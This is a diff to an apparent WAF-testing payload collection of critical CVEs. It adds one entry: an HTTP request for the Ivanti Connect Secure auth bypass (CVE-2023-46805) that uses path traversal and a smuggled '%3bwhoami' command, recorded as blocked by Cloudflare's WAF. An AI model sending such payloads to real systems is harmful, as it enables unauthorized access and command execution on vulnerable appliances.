@@ -1,8 +1,8 @@
 {
   "category": "xss",
   "subcategory": "cve_2020_2026_critical",
-  "description": "119 Critical CVEs from 2020-2026: Real-world vulnerabilities and WAF bypasses including CISA KEV",
-  "count": 119,
+  "description": "120 Critical CVEs from 2020-2026: Real-world vulnerabilities and WAF bypasses including CISA KEV",
+  "count": 120,
   "payloads": [
     {
       "id": "cve-2025-0001",
@@ -1680,6 +1680,22 @@
       "affected_versions": "Ivanti Connect Secure 9.x, 22.x",
       "disclosure_date": "2024-01-10",
       "source": "Ivanti Security Advisory, CISA KEV",
+      "tested_against": ["cloudflare_waf"],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-2023-0008",
+      "category": "auth_bypass",
+      "subcategory": "cve_ivanti_auth_bypass",
+      "payload": "GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bwhoami HTTP/1.1\nHost: target.com\nX-Forwarded-For: 127.0.0.1\n\n",
+      "description": "CVE-2023-46805: Ivanti Connect Secure authentication bypass - CVSS 8.2, CISA KEV, chained with CVE-2024-21887 for full compromise",
+      "cve": "CVE-2023-46805",
+      "severity": "high",
+      "cvss": "8.2",
+      "affected_versions": "Ivanti Connect Secure 9.x, 22.x, Policy Secure 9.x, 22.x",
+      "disclosure_date": "2024-01-10",
+      "source": "Ivanti Security Advisory, CISA KEV, Mandiant",
       "tested_against": ["cloudflare_waf"],
       "success_rate": 0.0,
       "blocked": true
